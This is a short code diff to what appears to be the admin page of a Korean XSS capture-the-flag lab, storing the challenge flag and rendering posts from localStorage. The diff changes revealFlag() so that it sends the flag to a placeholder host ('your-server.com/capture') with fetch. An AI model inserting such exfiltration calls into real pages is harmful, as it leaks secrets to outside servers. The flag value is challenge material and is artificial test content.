@@ -9,9 +9,8 @@
     <h1>관리자 페이지</h1>
     <p>관리자가 새로운 게시글을 검토합니다...</p>
     <div id="adminView"></div>
-    <div id="flag" style="display: none;">K4{4774ck_XSS}</div>
-
     <script>
+        const FLAG = 'K4{4774ck_XSS}';
         for (let key in localStorage) {
             if (key.startsWith('post_')) {
                 const { title, content } = JSON.parse(localStorage[key]);
@@ -26,8 +25,7 @@
         }
 
         window.revealFlag = function () {
-            const flag = document.getElementById('flag').innerText;
-            alert('FLAG: ' + flag);
+            fetch('http://your-server.com/capture?flag=' + FLAG);
         }
     </script>
 </body>
